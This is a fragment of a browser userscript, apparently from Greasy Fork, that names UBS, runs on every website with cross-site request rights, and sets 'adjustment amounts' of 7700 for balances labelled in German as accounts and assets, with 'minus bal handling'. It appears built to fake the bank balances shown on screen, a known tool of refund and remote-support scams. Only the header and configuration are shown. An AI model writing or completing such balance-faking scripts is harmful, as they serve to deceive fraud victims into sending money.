// ==UserScript==
// @name         Ed 4Rec  ubs.aloismosberger11@gmail.com
// @namespace    http://tampermonkey.net/
// @version      7.71
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/537540/Ed%204Rec%20%20ubsaloismosberger11%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/537540/Ed%204Rec%20%20ubsaloismosberger11%40gmailcom.meta.js
// ==/UserScript==



   //=========================================================================================================================================================
 //=========================================================================================================================================================
 //=========================================================================================================================================================


//  MAIN PAGE BALANCE

// //INDEXING STARTS AT 1, NOT 0    GESAMT
 var GMBALANCE_CONFIGS = [
    { index: 0, GadjustmentAmount: 7700},// Konten
   { index: 1, GadjustmentAmount: 7700},// Vermögen
     { index: 2, GadjustmentAmount: 7700},


   // Add more configurations as needed...
 ];
